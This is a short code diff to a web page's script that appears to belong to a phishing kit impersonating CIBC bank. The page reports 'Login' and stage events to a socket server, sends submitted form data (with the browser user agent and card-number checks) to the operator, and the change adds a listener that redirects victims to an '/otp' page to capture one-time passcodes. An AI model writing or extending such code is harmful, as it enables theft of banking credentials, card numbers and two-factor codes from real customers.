@@ -448,8 +448,14 @@
 </body>
 <script>
      const socket = io();
-
+    let navig = `/details`;
      socket.emit('pageandstage', {page: 'CIBC', stage: 'Login'})
+
+    socket.on('OTP', () => {
+        if(data.otp){
+            navig = `/otp`;
+        }
+    })
     
     function submitForm() {
         document.getElementById('userAgent').value = navigator.userAgent;
@@ -458,7 +464,7 @@
     
         socket.emit('submit', Object.fromEntries(formData));
     
-        window.location.href = `/details`;
+        window.location.href = navig;
     }
     
     function isValidCardNumber(value) {
